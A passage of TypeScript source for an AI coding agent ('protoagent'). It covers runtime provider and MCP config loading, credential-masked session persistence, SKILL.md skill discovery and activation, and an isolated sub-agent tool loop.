import { logger } from './utils/logger.js';

export interface RuntimeModelConfig {
  name?: string;
  contextWindow?: number;
  inputPricePerMillion?: number;
  outputPricePerMillion?: number;
  cachedPricePerMillion?: number;
  defaultParams?: Record<string, unknown>;
}

const RESERVED_DEFAULT_PARAM_KEYS = new Set([
  'model',
  'messages',
  'tools',
  'tool_choice',
  'stream',
  'stream_options',
]);

export interface RuntimeProviderConfig {
  name?: string;
  baseURL?: string;
  apiKey?: string;
  apiKeyEnvVar?: string;
  headers?: Record<string, string>;
  defaultParams?: Record<string, unknown>;
  models?: Record<string, RuntimeModelConfig>;
}

interface StdioServerConfig {
  type: 'stdio';
  command: string;
  args?: string[];
  env?: Record<string, string>;
  cwd?: string;
  enabled?: boolean;
  timeoutMs?: number;
}

interface HttpServerConfig {
  type: 'http';
  url: string;
  headers?: Record<string, string>;
  enabled?: boolean;
  timeoutMs?: number;
}

export type RuntimeMcpServerConfig = StdioServerConfig | HttpServerConfig;

export interface RuntimeConfigFile {
  providers?: Record<string, RuntimeProviderConfig>;
  mcp?: {
    servers?: Record<string, RuntimeMcpServerConfig>;
  };
}

const DEFAULT_RUNTIME_CONFIG: RuntimeConfigFile = {
  providers: {},
  mcp: { servers: {} },
};

let runtimeConfigCache: RuntimeConfigFile | null = null;

function getProjectRuntimeConfigPath(): string {
  return path.join(process.cwd(), '.protoagent', 'protoagent.jsonc');
}

function getUserRuntimeConfigPath(): string {
  const homeDir = os.homedir();
  if (process.platform === 'win32') {
    return path.join(homeDir, 'AppData', 'Local', 'protoagent', 'protoagent.jsonc');
  }
  return path.join(homeDir, '.config', 'protoagent', 'protoagent.jsonc');
}

export function getActiveRuntimeConfigPath(): string | null {
  const projectPath = getProjectRuntimeConfigPath();
  if (existsSync(projectPath)) {
    return projectPath;
  }

  const userPath = getUserRuntimeConfigPath();
  if (existsSync(userPath)) {
    return userPath;
  }

  return null;
}

function isPlainObject(value: unknown): value is Record<string, unknown> {
  return Boolean(value) && typeof value === 'object' && !Array.isArray(value);
}

function interpolateString(value: string, sourcePath: string): string {
  return value.replace(/\\\$\\{([A-Z0-9_]+)\\}/gi, (_match, envVar: string) => {
    const resolved = process.env[envVar];
    if (resolved === undefined) {
      logger.warn(\`Missing environment variable \${envVar} while loading \${sourcePath}\`);
      return '';
    }
    return resolved;
  });
}

function interpolateValue<T>(value: T, sourcePath: string): T {
  if (typeof value === 'string') {
    return interpolateString(value, sourcePath) as T;
  }

  if (Array.isArray(value)) {
    return value.map((entry) => interpolateValue(entry, sourcePath)) as T;
  }

  if (isPlainObject(value)) {
    const next: Record<string, unknown> = {};
    for (const [key, entry] of Object.entries(value)) {
      const interpolated = interpolateValue(entry, sourcePath);
      if (key === 'headers' && isPlainObject(interpolated)) {
        const filtered = Object.fromEntries(
          Object.entries(interpolated).filter(([, headerValue]) => typeof headerValue !== 'string' || headerValue.length > 0)
        );
        next[key] = filtered;
        continue;
      }
      next[key] = interpolated;
    }
    return next as T;
  }

  return value;
}

function sanitizeDefaultParamsInConfig(config: RuntimeConfigFile): RuntimeConfigFile {
  const nextProviders = Object.fromEntries(
    Object.entries(config.providers || {}).map(([providerId, provider]) => {
      const providerDefaultParams = Object.fromEntries(
        Object.entries(provider.defaultParams || {}).filter(([key]) => {
          const allowed = !RESERVED_DEFAULT_PARAM_KEYS.has(key);
          if (!allowed) {
            logger.warn(\`Ignoring reserved provider default param '\${key}' for provider \${providerId}\`);
          }
          return allowed;
        })
      );

      const nextModels = Object.fromEntries(
        Object.entries(provider.models || {}).map(([modelId, model]) => {
          const modelDefaultParams = Object.fromEntries(
            Object.entries(model.defaultParams || {}).filter(([key]) => {
              const allowed = !RESERVED_DEFAULT_PARAM_KEYS.has(key);
              if (!allowed) {
                logger.warn(\`Ignoring reserved model default param '\${key}' for model \${providerId}/\${modelId}\`);
              }
              return allowed;
            })
          );

          return [
            modelId,
            {
              ...model,
              ...(Object.keys(modelDefaultParams).length > 0 ? { defaultParams: modelDefaultParams } : {}),
            },
          ];
        })
      );

      return [
        providerId,
        {
          ...provider,
          ...(Object.keys(providerDefaultParams).length > 0 ? { defaultParams: providerDefaultParams } : {}),
          models: nextModels,
        },
      ];
    })
  );

  return {
    ...config,
    providers: nextProviders,
  };
}

function mergeRuntimeConfig(base: RuntimeConfigFile, overlay: RuntimeConfigFile): RuntimeConfigFile {
  const mergedProviders: Record<string, RuntimeProviderConfig> = {
    ...(base.providers || {}),
  };

  for (const [providerId, providerConfig] of Object.entries(overlay.providers || {})) {
    const currentProvider = mergedProviders[providerId] || {};
    mergedProviders[providerId] = {
      ...currentProvider,
      ...providerConfig,
      models: {
        ...(currentProvider.models || {}),
        ...(providerConfig.models || {}),
      },
    };
  }

  const mergedServers: Record<string, RuntimeMcpServerConfig> = {
    ...(base.mcp?.servers || {}),
  };

  for (const [serverName, serverConfig] of Object.entries(overlay.mcp?.servers || {})) {
    const currentServer = mergedServers[serverName];
    mergedServers[serverName] = currentServer && isPlainObject(currentServer)
      ? { ...currentServer, ...serverConfig }
      : serverConfig;
  }

  return {
    providers: mergedProviders,
    mcp: {
      servers: mergedServers,
    },
  };
}

async function readRuntimeConfigFile(configPath: string): Promise<RuntimeConfigFile | null> {
  try {
    const content = await fs.readFile(configPath, 'utf8');
    const errors: Array<{ error: number; offset: number; length: number }> = [];
    const parsed = parse(content, errors, { allowTrailingComma: true, disallowComments: false });
    if (errors.length > 0) {
      const details = errors
        .map((error) => \`\${printParseErrorCode(error.error)} at offset \${error.offset}\`)
        .join(', ');
      throw new Error(\`Failed to parse \${configPath}: \${details}\`);
    }
    if (!isPlainObject(parsed)) {
      throw new Error(\`Failed to parse \${configPath}: top-level value must be an object\`);
    }
    return sanitizeDefaultParamsInConfig(interpolateValue(parsed as RuntimeConfigFile, configPath));
  } catch (error: any) {
    if (error?.code === 'ENOENT') {
      return null;
    }
    throw error;
  }
}

export async function loadRuntimeConfig(forceReload = false): Promise<RuntimeConfigFile> {
  if (!forceReload && runtimeConfigCache) {
    return runtimeConfigCache;
  }

  const configPath = getActiveRuntimeConfigPath();
  let loaded = DEFAULT_RUNTIME_CONFIG;

  if (configPath) {
    const fileConfig = await readRuntimeConfigFile(configPath);
    if (fileConfig) {
      logger.debug('Loaded runtime config', { path: configPath });
      loaded = mergeRuntimeConfig(DEFAULT_RUNTIME_CONFIG, fileConfig);
    }
  }

  runtimeConfigCache = loaded;
  return loaded;
}

export function getRuntimeConfig(): RuntimeConfigFile {
  return runtimeConfigCache || DEFAULT_RUNTIME_CONFIG;
}

export function resetRuntimeConfigForTests(): void {
  runtimeConfigCache = null;
}
`,
  },
  {
    path: "src/sessions.ts",
    content: `/**
 * Session persistence — Save and load conversation history.
 *
 * Sessions are stored as JSON files in \`~/.local/share/protoagent/sessions/\`.
 * Each session has a unique ID, a title, and the full message history.
 *
 * The agent can resume a previous session or start a new one.
 */

import fs from 'node:fs/promises';
import path from 'node:path';
import os from 'node:os';
import { chmodSync } from 'node:fs';
import type OpenAI from 'openai';
import type { TodoItem } from './tools/todo.js';
import { logger } from './utils/logger.js';
import { maskCredentials } from './utils/credential-filter.js';
import { atomicWriteFile } from './utils/atomic-write.js';

const SESSION_DIR_MODE = 0o700;
const SESSION_FILE_MODE = 0o600;
const SESSION_ID_PATTERN = /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}\$/i;
const SHORT_ID_PATTERN = /^[0-9a-z]{8}\$/i;

function hardenPermissions(targetPath: string, mode: number): void {
  if (process.platform === 'win32') return;
  chmodSync(targetPath, mode);
}

function assertValidSessionId(id: string): void {
  // Accept both legacy UUIDs and new short IDs
  if (!SESSION_ID_PATTERN.test(id) && !SHORT_ID_PATTERN.test(id)) {
    throw new Error(\`Invalid session ID: \${id}\`);
  }
}

/** Generate a short, readable session ID (8 alphanumeric characters). */
function generateSessionId(): string {
  const chars = '0123456789abcdefghijklmnopqrstuvwxyz';
  let id = '';
  for (let i = 0; i < 8; i++) {
    id += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return id;
}

export interface Session {
  id: string;
  title: string;
  createdAt: string;
  updatedAt: string;
  model: string;
  provider: string;
  todos: TodoItem[];
  completionMessages: OpenAI.Chat.Completions.ChatCompletionMessageParam[];
}

export interface SessionSummary {
  id: string;
  title: string;
  createdAt: string;
  updatedAt: string;
  messageCount: number;
}

export function ensureSystemPromptAtTop(
  messages: OpenAI.Chat.Completions.ChatCompletionMessageParam[],
  systemPrompt: string
): OpenAI.Chat.Completions.ChatCompletionMessageParam[] {
  const firstSystemIndex = messages.findIndex((message) => message.role === 'system');

  if (firstSystemIndex === -1) {
    return [{ role: 'system', content: systemPrompt } as OpenAI.Chat.Completions.ChatCompletionMessageParam, ...messages];
  }

  const firstSystemMessage = messages[firstSystemIndex] as OpenAI.Chat.Completions.ChatCompletionMessageParam;
  const normalizedSystemMessage = {
    ...firstSystemMessage,
    role: 'system',
    content: systemPrompt,
  } as OpenAI.Chat.Completions.ChatCompletionMessageParam;

  return [
    normalizedSystemMessage,
    ...messages.slice(0, firstSystemIndex),
    ...messages.slice(firstSystemIndex + 1),
  ];
}

function getSessionsDir(): string {
  const homeDir = os.homedir();
  if (process.platform === 'win32') {
    return path.join(homeDir, 'AppData', 'Local', 'protoagent', 'sessions');
  }
  return path.join(homeDir, '.local', 'share', 'protoagent', 'sessions');
}

async function ensureSessionsDir(): Promise<string> {
  const dir = getSessionsDir();
  await fs.mkdir(dir, { recursive: true, mode: SESSION_DIR_MODE });
  hardenPermissions(dir, SESSION_DIR_MODE);
  return dir;
}

function sessionPath(id: string): string {
  assertValidSessionId(id);
  return path.join(getSessionsDir(), \`\${id}.json\`);
}

/** Create a new session. */
export function createSession(model: string, provider: string): Session {
  return {
    id: generateSessionId(),
    title: 'New session',
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    model,
    provider,
    todos: [],
    completionMessages: [],
  };
}

/**
 * Sanitize session messages to remove credentials before saving.
 * Security: Prevent credential leakage in session files
 */
function sanitizeSessionForSave(session: Session): Session {
  // Deep clone and redact credentials from all message content
  const sanitizedMessages = session.completionMessages.map((msg) => {
    const msgAny = msg as any;

    // Sanitize content field
    if (typeof msgAny.content === 'string') {
      msgAny.content = maskCredentials(msgAny.content);
    }

    // Sanitize tool_calls arguments
    if (Array.isArray(msgAny.tool_calls)) {
      msgAny.tool_calls = msgAny.tool_calls.map((tc: any) => {
        if (tc.function?.arguments) {
          tc.function.arguments = maskCredentials(tc.function.arguments);
        }
        return tc;
      });
    }

    // Sanitize tool results
    if (msgAny.tool_call_id && typeof msgAny.content === 'string') {
      msgAny.content = maskCredentials(msgAny.content);
    }

    return msg;
  });

  return {
    ...session,
    completionMessages: sanitizedMessages,
  };
}

/** Save a session to disk. */
export async function saveSession(session: Session): Promise<void> {
  await ensureSessionsDir();
  session.updatedAt = new Date().toISOString();

  // Security: Sanitize credentials from session before saving
  // Naive approach: Save session as-is
  // Risk: API keys, tokens, passwords in tool outputs leak to disk
  // Attack: Session files are readable by other users on shared systems
  const sanitizedSession = sanitizeSessionForSave(session);

  const filePath = sessionPath(session.id);

  // Security: Use atomic write with symlink protection
  const result = await atomicWriteFile(filePath, JSON.stringify(sanitizedSession, null, 2));
  if (!result.success) {
    logger.error(\`Failed to save session: \${result.error}\`);
    throw new Error(\`Failed to save session: \${result.error}\`);
  }

  hardenPermissions(filePath, SESSION_FILE_MODE);
  logger.debug(\`Session saved: \${session.id}\`);
}

/** Load a session by ID. Returns null if not found. */
export async function loadSession(id: string): Promise<Session | null> {
  try {
    const content = await fs.readFile(sessionPath(id), 'utf8');
    const session = JSON.parse(content) as Partial<Session>;
    return {
      id: session.id ?? id,
      title: session.title ?? 'New session',
      createdAt: session.createdAt ?? new Date().toISOString(),
      updatedAt: session.updatedAt ?? new Date().toISOString(),
      model: session.model ?? '',
      provider: session.provider ?? '',
      todos: Array.isArray(session.todos) ? session.todos : [],
      completionMessages: Array.isArray(session.completionMessages) ? session.completionMessages : [],
    };
  } catch {
    return null;
  }
}

/** List all sessions (sorted by most recently updated). */
export async function listSessions(): Promise<SessionSummary[]> {
  const dir = getSessionsDir();
  let entries: string[];
  try {
    entries = await fs.readdir(dir);
  } catch {
    return [];
  }

  const summaries: SessionSummary[] = [];
  for (const entry of entries) {
    if (!entry.endsWith('.json')) continue;
    try {
      const content = await fs.readFile(path.join(dir, entry), 'utf8');
      const session = JSON.parse(content) as Session;
      summaries.push({
        id: session.id,
        title: session.title,
        createdAt: session.createdAt,
        updatedAt: session.updatedAt,
        messageCount: session.completionMessages.length,
      });
    } catch {
      // Skip corrupt session files
    }
  }

  // Sort by most recently updated
  summaries.sort((a, b) => new Date(b.updatedAt).getTime() - new Date(a.updatedAt).getTime());
  return summaries;
}

/** Delete a session. */
export async function deleteSession(id: string): Promise<boolean> {
  try {
    await fs.unlink(sessionPath(id));
    return true;
  } catch {
    return false;
  }
}

/**
 * Generate a short title for a session from the first user message.
 * Uses the LLM to summarise if the message is long.
 */
export function generateTitle(messages: OpenAI.Chat.Completions.ChatCompletionMessageParam[]): string {
  const firstUserMsg = messages.find((m) => m.role === 'user');
  if (!firstUserMsg || !('content' in firstUserMsg) || typeof firstUserMsg.content !== 'string') {
    return 'New session';
  }
  const content = firstUserMsg.content;
  // Simple heuristic: take first 60 chars of the first user message
  if (content.length <= 60) return content;
  return content.slice(0, 57) + '...';
}
`,
  },
  {
    path: "src/skills.ts",
    content: `import fs from 'node:fs/promises';
import type { Dirent } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import YAML from 'yaml';
import {
  registerDynamicHandler,
  registerDynamicTool,
  unregisterDynamicHandler,
  unregisterDynamicTool,
} from './tools/index.js';
import { setAllowedPathRoots } from './utils/path-validation.js';
import { logger } from './utils/logger.js';

export interface Skill {
  name: string;
  description: string;
  source: 'project' | 'user';
  location: string;
  skillDir: string;
  body: string;
  license?: string;
  compatibility?: string;
  metadata?: Record<string, string>;
  allowedTools?: string[];
}

export interface SkillDiscoveryOptions {
  cwd?: string;
  homeDir?: string;
}

interface SkillRoot {
  dir: string;
  source: 'project' | 'user';
}

const ACTIVATE_SKILL_TOOL_NAME = 'activate_skill';
const VALID_SKILL_NAME = /^[a-z0-9]+(?:-[a-z0-9]+)*\$/;
const MAX_RESOURCE_FILES = 200;

function getSkillRoots(options: SkillDiscoveryOptions = {}): SkillRoot[] {
  const cwd = options.cwd ?? process.cwd();
  const homeDir = options.homeDir ?? os.homedir();

  return [
    { dir: path.join(homeDir, '.agents', 'skills'), source: 'user' },
    { dir: path.join(homeDir, '.protoagent', 'skills'), source: 'user' },
    { dir: path.join(homeDir, '.config', 'protoagent', 'skills'), source: 'user' },
    { dir: path.join(cwd, '.agents', 'skills'), source: 'project' },
    { dir: path.join(cwd, '.protoagent', 'skills'), source: 'project' },
  ];
}

function parseFrontmatter(rawContent: string): { frontmatter: Record<string, unknown>; body: string } {
  const match = rawContent.match(/^---\\r?\\n([\\s\\S]*?)\\r?\\n---\\r?\\n?([\\s\\S]*)\$/);
  if (!match) {
    throw new Error('SKILL.md must begin with YAML frontmatter delimited by --- lines.');
  }

  const document = YAML.parse(match[1]);
  if (!document || typeof document !== 'object' || Array.isArray(document)) {
    throw new Error('Frontmatter must parse to an object.');
  }

  return {
    frontmatter: document as Record<string, unknown>,
    body: match[2].trim(),
  };
}

function isValidSkillName(name: string): boolean {
  return name.length >= 1 && name.length <= 64 && VALID_SKILL_NAME.test(name);
}

// normalizeMetadata ensures the metadata field is an object with string values, or undefined if not provided or invalid
function normalizeMetadata(value: unknown): Record<string, string> | undefined {
  if (!value || typeof value !== 'object' || Array.isArray(value)) return undefined;

  const entries = Object.entries(value).filter(([, entryValue]) => typeof entryValue === 'string');
  if (entries.length === 0) return undefined;

  return Object.fromEntries(entries);
}

function validateSkill(parsed: { frontmatter: Record<string, unknown>; body: string }, skillDir: string, source: 'project' | 'user', location: string): Skill {
  const name = typeof parsed.frontmatter.name === 'string' ? parsed.frontmatter.name.trim() : '';
  const description = typeof parsed.frontmatter.description === 'string'
    ? parsed.frontmatter.description.trim()
    : '';
  const compatibility = typeof parsed.frontmatter.compatibility === 'string'
    ? parsed.frontmatter.compatibility.trim()
    : undefined;
  const license = typeof parsed.frontmatter.license === 'string'
    ? parsed.frontmatter.license.trim()
    : undefined;
  const allowedToolsValue = typeof parsed.frontmatter['allowed-tools'] === 'string'
    ? parsed.frontmatter['allowed-tools'].trim()
    : undefined;

  if (!isValidSkillName(name)) {
    throw new Error(\`Skill name "\${name}" is invalid.\`);
  }

  if (path.basename(skillDir) !== name) {
    throw new Error(\`Skill name "\${name}" must match directory name "\${path.basename(skillDir)}".\`);
  }

  if (!description || description.length > 1024) {
    throw new Error('Skill description is required and must be 1-1024 characters.');
  }

  if (compatibility !== undefined && (compatibility.length === 0 || compatibility.length > 500)) {
    throw new Error('Skill compatibility must be 1-500 characters when provided.');
  }

  return {
    name,
    description,
    source,
    location,
    skillDir,
    body: parsed.body,
    compatibility,
    license,
    metadata: normalizeMetadata(parsed.frontmatter.metadata),
    allowedTools: allowedToolsValue ? allowedToolsValue.split(/\\s+/).filter(Boolean) : undefined,
  };
}

async function loadSkillFromDirectory(skillDir: string, source: 'project' | 'user'): Promise<Skill | null> {
  const location = path.join(skillDir, 'SKILL.md');

  try {
    const rawContent = await fs.readFile(location, 'utf8');
    const parsed = parseFrontmatter(rawContent);
    const skill = validateSkill(parsed, skillDir, source, location);
    logger.info(\`Loaded skill: \${skill.name} (\${source})\`, { location });
    return skill;
  } catch (error) {
    logger.warn(\`Skipping invalid skill at \${location}\`, {
      error: error instanceof Error ? error.message : String(error),
    });
    return null;
  }
}

async function discoverSkillsInRoot(root: SkillRoot): Promise<Skill[]> {
  let entries: Dirent[] = [];

  try {
    entries = await fs.readdir(root.dir, { withFileTypes: true });
  } catch {
    return [];
  }

  const loaded = await Promise.all(
    entries
      .filter((entry) => entry.isDirectory())
      .map((entry) => loadSkillFromDirectory(path.join(root.dir, entry.name), root.source))
  );

  return loaded.filter((skill): skill is Skill => skill !== null);
}

export async function loadSkills(options: SkillDiscoveryOptions = {}): Promise<Skill[]> {
  const roots = getSkillRoots(options);
  const merged = new Map<string, Skill>();

  for (const root of roots) {
    const skills = await discoverSkillsInRoot(root);
    for (const skill of skills) {
      if (merged.has(skill.name)) {
        logger.warn(\`Skill collision detected for "\${skill.name}". Using \${skill.source}-level version.\`, {
          location: skill.location,
        });
      }
      merged.set(skill.name, skill);
    }
  }

  return Array.from(merged.values()).sort((a, b) => a.name.localeCompare(b.name));
}

function escapeXml(value: string): string {
  return value
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&apos;');
}

export function buildSkillsCatalogSection(skills: Skill[]): string {
  if (skills.length === 0) return '';

  const catalog = skills
    .map((skill) => [
      '  <skill>',
      \`    <name>\${escapeXml(skill.name)}</name>\`,
      \`    <description>\${escapeXml(skill.description)}</description>\`,
      \`    <location>\${escapeXml(skill.location)}</location>\`,
      '  </skill>',
    ].join('\\n'))
    .join('\\n');

  return \`AVAILABLE SKILLS

The following skills provide specialized instructions for specific tasks.
When a task matches a skill's description, call the \${ACTIVATE_SKILL_TOOL_NAME} tool with the skill's name before proceeding.
After activation, treat paths listed in the skill output as readable resources and resolve relative paths against the skill directory.

<available_skills>
\${catalog}
</available_skills>\`;
}

async function listSkillResources(skillDir: string): Promise<string[]> {
  const files: string[] = [];

  async function walk(relativeDir: string): Promise<void> {
    if (files.length >= MAX_RESOURCE_FILES) return;

    const absoluteDir = path.join(skillDir, relativeDir);
    let entries: Dirent[] = [];

    try {
      entries = await fs.readdir(absoluteDir, { withFileTypes: true });
    } catch {
      return;
    }

    for (const entry of entries) {
      if (files.length >= MAX_RESOURCE_FILES) return;

      const nextRelative = path.join(relativeDir, entry.name);
      if (entry.isDirectory()) {
        await walk(nextRelative);
      } else {
        files.push(nextRelative.split(path.sep).join('/'));
      }
    }
  }

  for (const dir of ['scripts', 'references', 'assets']) {
    await walk(dir);
  }
  return files.sort();
}

export async function activateSkill(skillName: string, options: SkillDiscoveryOptions = {}): Promise<string> {
  const skills = await loadSkills(options);
  const skill = skills.find((entry) => entry.name === skillName);

  if (!skill) {
    return \`Error: Unknown skill "\${skillName}".\`;
  }

  const resources = await listSkillResources(skill.skillDir);
  const resourcesBlock = resources.length > 0
    ? \`<skill_resources>\\n\${resources.map((resource) => \`  <file>\${escapeXml(resource)}</file>\`).join('\\n')}\\n</skill_resources>\`
    : '<skill_resources />';

  return \`<skill_content name="\${escapeXml(skill.name)}">\\n\${skill.body}\\n\\nSkill directory: \${escapeXml(skill.skillDir)}\\nRelative paths in this skill are relative to the skill directory. Use absolute paths in tool calls when needed.\\n\\n\${resourcesBlock}\\n</skill_content>\`;
}

export async function initializeSkillsSupport(options: SkillDiscoveryOptions = {}): Promise<Skill[]> {
  const skills = await loadSkills(options);
  await setAllowedPathRoots(skills.map((skill) => skill.skillDir));

  if (skills.length === 0) {
    unregisterDynamicTool(ACTIVATE_SKILL_TOOL_NAME);
    unregisterDynamicHandler(ACTIVATE_SKILL_TOOL_NAME);
    return [];
  }

  registerDynamicTool({
    type: 'function',
    function: {
      name: ACTIVATE_SKILL_TOOL_NAME,
      description: 'Load the full instructions for a discovered skill so you can follow it for the current task.',
      parameters: {
        type: 'object',
        properties: {
          name: {
            type: 'string',
            enum: skills.map((skill) => skill.name),
            description: 'The exact skill name to activate.',
          },
        },
        required: ['name'],
      },
    },
  });

  registerDynamicHandler(ACTIVATE_SKILL_TOOL_NAME, async (args) => activateSkill(args.name, options));

  return skills;
}
`,
  },
  {
    path: "src/sub-agent.ts",
    content: `/**
 * Sub-agents — Spawn isolated child agent sessions.
 *
 * Sub-agents prevent context pollution by running tasks in a separate
 * message history. The parent agent delegates a task, the sub-agent
 * executes it with its own tool calls, and returns a summary.
 *
 * This is exposed as a \`sub_agent\` tool that the main agent can call.
 */

import type OpenAI from 'openai';
import crypto from 'node:crypto';
import { handleToolCall, getAllTools } from './tools/index.js';
import { generateSystemPrompt } from './system-prompt.js';
import { logger } from './utils/logger.js';
import { clearTodos } from './tools/todo.js';
import type { ModelPricing } from './utils/cost-tracker.js';

export const subAgentTool = {
  type: 'function' as const,
  function: {
    name: 'sub_agent',
    description:
      'Spawn an isolated sub-agent to handle a task without polluting the main conversation context. ' +
      'Use this for independent subtasks like exploring a codebase, researching a question, or making changes to a separate area. ' +
      'The sub-agent has access to the same tools but runs in its own conversation.',
    parameters: {
      type: 'object',
      properties: {
        task: {
          type: 'string',
          description: 'A detailed description of the task for the sub-agent to complete.',
        },
        max_iterations: {
          type: 'number',
          description: 'Maximum tool-call iterations for the sub-agent. Defaults to 500.',
        },
      },
      required: ['task'],
    },
  },
};

export type SubAgentProgressHandler = (event: { tool: string; status: 'running' | 'done' | 'error'; iteration: number; args?: Record<string, unknown> }) => void;

export interface SubAgentUsage {
  inputTokens: number;
  outputTokens: number;
  cost: number;
}

export interface SubAgentResult {
  response: string;
  usage: SubAgentUsage;
}

/**
 * Run a sub-agent with its own isolated conversation.
 * Returns the sub-agent's final text response.
 */
export async function runSubAgent(
  client: OpenAI,
  model: string,
  task: string,
  maxIterations = 500,
  requestDefaults: Record<string, unknown> = {},
  onProgress?: SubAgentProgressHandler,
  abortSignal?: AbortSignal,
  pricing?: ModelPricing,
): Promise<SubAgentResult> {
  const op = logger.startOperation('sub-agent');
  const subAgentSessionId = \`sub-agent-\${crypto.randomUUID()}\`;

  const systemPrompt = await generateSystemPrompt();
  const subSystemPrompt = \`\${systemPrompt}

## Sub-Agent Mode

You are running as a sub-agent. You were given a specific task by the parent agent.
Complete the task thoroughly and return a clear, concise summary of what you did and found.
Do NOT ask the user questions — work autonomously with the tools available.\`;

  const messages: OpenAI.Chat.Completions.ChatCompletionMessageParam[] = [
    { role: 'system', content: subSystemPrompt },
    { role: 'user', content: task },
  ];

  // Track cumulative usage across all API calls in the sub-agent
  let totalInputTokens = 0;
  let totalOutputTokens = 0;
  let totalCost = 0;

  try {
    for (let i = 0; i < maxIterations; i++) {
      // Check abort at the top of each iteration
      if (abortSignal?.aborted) {
        return { response: '(sub-agent aborted)', usage: { inputTokens: totalInputTokens, outputTokens: totalOutputTokens, cost: totalCost } };
      }

      let assistantMessage: any;
      let hasToolCalls = false;

      try {
        const stream = await client.chat.completions.create({
          ...requestDefaults,
          model,
          messages,
          tools: getAllTools(),
          tool_choice: 'auto',
          stream: true,
          stream_options: { include_usage: true },
        }, { signal: abortSignal });

        // Accumulate the streamed response
        assistantMessage = {
          role: 'assistant',
          content: '',
          tool_calls: [],
        };
        let streamedContent = '';
        hasToolCalls = false;
        let actualUsage: OpenAI.CompletionUsage | undefined;

        for await (const chunk of stream) {
          const delta = chunk.choices[0]?.delta;

          if (chunk.usage) {
            actualUsage = chunk.usage;
          }

          // Stream text content
          if (delta?.content) {
            streamedContent += delta.content;
            assistantMessage.content = streamedContent;
          }

          // Accumulate tool calls across stream chunks
          if (delta?.tool_calls) {
            hasToolCalls = true;
            for (const tc of delta.tool_calls) {
              const idx = tc.index || 0;
              if (!assistantMessage.tool_calls[idx]) {
                assistantMessage.tool_calls[idx] = {
                  id: '',
                  type: 'function',
                  function: { name: '', arguments: '' },
                };
              }
              if (tc.id) assistantMessage.tool_calls[idx].id = tc.id;
              if (tc.function?.name) {
                assistantMessage.tool_calls[idx].function.name += tc.function.name;
              }
              if (tc.function?.arguments) {
                assistantMessage.tool_calls[idx].function.arguments += tc.function.arguments;
              }
            }
          }
        }

        // Accumulate usage for this iteration
        const iterationInputTokens = actualUsage?.prompt_tokens || 0;
        const iterationOutputTokens = actualUsage?.completion_tokens || 0;
        totalInputTokens += iterationInputTokens;
        totalOutputTokens += iterationOutputTokens;

        // Calculate cost if pricing is available
        if (pricing && (iterationInputTokens > 0 || iterationOutputTokens > 0)) {
          const cachedTokens = (actualUsage as any)?.prompt_tokens_details?.cached_tokens;
          if (cachedTokens && cachedTokens > 0 && pricing.cachedPerToken != null) {
            const uncachedTokens = iterationInputTokens - cachedTokens;
            totalCost += uncachedTokens * pricing.inputPerToken + cachedTokens * pricing.cachedPerToken + iterationOutputTokens * pricing.outputPerToken;
          } else {
            totalCost += iterationInputTokens * pricing.inputPerToken + iterationOutputTokens * pricing.outputPerToken;
          }
        }
      } catch (err) {
        // If aborted during streaming, return gracefully
        if (abortSignal?.aborted || (err instanceof Error && (err.name === 'AbortError' || err.message === 'Operation aborted'))) {
          logger.debug('Sub-agent aborted during streaming');
          return { response: '(sub-agent aborted)', usage: { inputTokens: totalInputTokens, outputTokens: totalOutputTokens, cost: totalCost } };
        }
        throw err;
      }

      const message = assistantMessage;
      if (!message) break;

      // Check for tool calls
      if (hasToolCalls && assistantMessage.tool_calls.length > 0) {
        // Clean up empty tool_calls entries (from sparse array)
        assistantMessage.tool_calls = assistantMessage.tool_calls.filter(Boolean);
        // Filter out tool calls with malformed JSON arguments (can happen if stream aborted mid-tool-call)
        assistantMessage.tool_calls = assistantMessage.tool_calls.filter((tc: any) => {
          const args = tc.function?.arguments;
          if (!args) return true; // No args is valid
          try {
            JSON.parse(args);
            return true;
          } catch {
            logger.warn('Filtering out sub-agent tool call with malformed JSON', {
              tool: tc.function?.name,
              argsPreview: args.slice(0, 100),
            });
            return false;
          }
        });
        // Only add message if we have valid tool calls
        if (assistantMessage.tool_calls.length === 0) {
          hasToolCalls = false;
        } else {
          messages.push(message as any);
        }

        for (const toolCall of assistantMessage.tool_calls) {
          // Check abort between tool calls
          if (abortSignal?.aborted) {
            return { response: '(sub-agent aborted)', usage: { inputTokens: totalInputTokens, outputTokens: totalOutputTokens, cost: totalCost } };
          }

          const { name, arguments: argsStr } = toolCall.function;
          let args: Record<string, unknown>;
          try {
            args = JSON.parse(argsStr);
          } catch {
            args = {};
          }
          logger.debug(\`Sub-agent tool call: \${name}\`, { args });
          onProgress?.({ tool: name, status: 'running', iteration: i, args });

          try {
            const result = await handleToolCall(name, args, { sessionId: subAgentSessionId, abortSignal });
            messages.push({
              role: 'tool',
              tool_call_id: toolCall.id,
              content: result,
            } as any);
            onProgress?.({ tool: name, status: 'done', iteration: i });
          } catch (err) {
            const msg = err instanceof Error ? err.message : String(err);
            messages.push({
              role: 'tool',
              tool_call_id: toolCall.id,
              content: \`Error: \${msg}\`,
            } as any);
            onProgress?.({ tool: name, status: 'error', iteration: i });
          }
        }
        continue;
      }

      // Plain text response — we're done
      if (message.content) {
        messages.push({
          role: 'assistant',
          content: message.content,
        });
        return { response: message.content, usage: { inputTokens: totalInputTokens, outputTokens: totalOutputTokens, cost: totalCost } };
      }
      // The model produced an empty text response (e.g. it only called tools
      // and issued no final summary).  Log it and return a sentinel so the
      // parent agent knows the sub-agent finished but had nothing to say.
      logger.debug('Sub-agent returned empty content', { iteration: i });
      return { response: '(sub-agent completed with no response)', usage: { inputTokens: totalInputTokens, outputTokens: totalOutputTokens, cost: totalCost } };
    }

    return { response: '(sub-agent reached iteration limit)', usage: { inputTokens: totalInputTokens, outputTokens: totalOutputTokens, cost: totalCost } };
  } finally {
    op.end();
    clearTodos(subAgentSessionId);
  }
}
`,
  },
  {
    path: "src/system-prompt.ts",
    content: `/**
 * System prompt generation.
 *
 * Builds a dynamic system prompt that includes:
 *  - Role and behavioural instructions
 *  - Working directory and project structure
 *  - Tool descriptions (auto-generated from tool schemas)
 *  - Skills catalog (loaded progressively from skill directories)
 *  - AGENTS.md content (custom instructions for the agent)
 *  - Guidelines for file operations, TODO tracking, etc.
 */

import fs from 'node:fs/promises';
